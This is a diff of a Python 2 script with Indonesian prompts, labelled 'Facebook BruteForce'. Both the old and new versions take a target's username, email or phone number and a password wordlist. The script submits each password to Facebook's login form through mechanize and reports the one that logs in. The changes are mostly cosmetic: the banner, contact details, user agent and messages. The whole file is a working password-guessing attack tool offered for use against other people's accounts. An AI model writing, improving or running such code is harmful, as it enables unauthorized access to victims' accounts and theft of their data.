@@ -1,9 +1,9 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-        #___________________________________________#
+        #############################################
         #                                           #
-        #       Facebook BruteForce, by BUDIMAN     #
-        #       Contact: ariftau285@gmail.com       #
+        #       Facebook BruteForce, by budiman     #
+        #       Contact: github.com/und3f1n3        #
         #                                           #
         #############################################
 
@@ -21,30 +21,30 @@ except ModuleNotFoundError:
 
 time.sleep(0.5)
 print('''
- ____BetaTest  2.0_________________________
+ ____BetaTest  2.9_________________________
 | __ ) _   _  __| / |_ __ ___   __ _| \ | |
 |  _ \| | | |/ _` | | '_ ` _ \ / _` |  \| |
 | |_) | |_| | (_| | | | | | | | (_| | |\  |
 |____/ \__,_|\__,_|_|_| |_| |_|\__,_|_| \_|
 
 ''')
-user = raw_input('[?] Target Username/ID/Email/PHONE >>> ')
-time.sleep(2)
-print '\nmembaca data '+user+'...'
-time.sleep(1)
-print '\n'
-wrdlstFileName = raw_input('\n[?] Wordlist.txt >>> ')
+time.sleep(0.5)
+user = raw_input('[?] Target Username/ID/Email/phone >>> ')
+time.sleep(1.7)
+print '\nmembaca data '+user+' database'
+time.sleep(0.8)
+wrdlstFileName = raw_input('\n[?] ketik wordlist.txt >>> ')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
-    print ('\n[!] File tidak ditemukan!')
+    print ('\n[!] file tidak ditemukan!')
     exit()
 
 time.sleep(0.8)
 print '\n\nCracking '+user+' sekarang...'
 
 time.sleep(1)
-print '\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n'
+print '\n#############################################\n'
 for password in wordlist:
     if password == '' or password == ' ':
         pass
@@ -52,35 +52,32 @@ for password in wordlist:
         try:
             browser = mechanize.Browser()
             browser.set_handle_robots(False)
-            browser.addheaders = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-            fb = browser.open('https://web.facebook.com')
+            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
+            fb = browser.open('https://facebook.com')
             dos = open('Facebook-Log.txt', 'w+')
             browser.select_form(nr=0)
             browser.form['email'] = user
             browser.form['pass'] = password
             browser.method = 'POST'
             browser.submit()
-            dos.write(browser.open('https://web.facebook.com').read())
+            dos.write(browser.open('https://facebook.com').read())
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
-                print '[+] target Password ditemukan!! > '+password 
+                print '[+] Password Ditemukan > '+password 
                 dos.close()
                 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                 exit()
             else:
-                print "[!]Sandi ini salah! > "+str(password)
+                print "[!] password salah! > "+str(password)
         except KeyboardInterrupt:
-            print '\n<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n   Exiting..'
+            print '\n#############################################\n   Exiting..'
             dos.close()
             os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
             exit()
 
 time.sleep(1)
-print 'tak ada satupun SANDI yang bener coba pake racikan sendiri.ketik seperti di bawah ini untuk meracik'
-time.sleep(0.9)
-print '\nnano wordlist.txt'
+print 'Sorry, gak ada satupun sandi yang bener, coba racik sendiri.'
 time.sleep(0.8)
 dos.close()
 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
